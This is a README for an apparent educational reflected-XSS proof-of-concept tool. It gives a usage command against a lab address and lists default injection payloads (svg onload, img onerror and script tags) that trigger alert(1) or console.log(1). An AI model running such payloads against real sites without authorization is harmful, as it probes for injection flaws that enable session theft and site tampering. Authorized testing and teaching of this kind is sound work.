# Reflected XSS PoC

**Description:**  
This repository contains a minimal, educational Proof-of-Concept for Reflected XSS (Cross-Site Scripting).  
It is intended **only for authorized lab/testing environments**.

## Requirements
- Python 3.8+
- requests library: `pip install requests`

## Usage
```bash
python exploit.py --target http://10.10.10.10:8000 --endpoint /search --param q --debug
```
## Payloads
**The script includes default payloads:**
- <svg/onload=alert(1)>
- "><svg/onload=alert(1)>
- <img src=x onerror=alert(1)>
- "><script>console.log(1)</script>
> You can also provide custom payloads with --payloads.

## Notes
- Only use in authorized testing environments.
- PoC is minimal and meant for educational purposes.
- Do not use for malicious purposes.

## License
> MIT
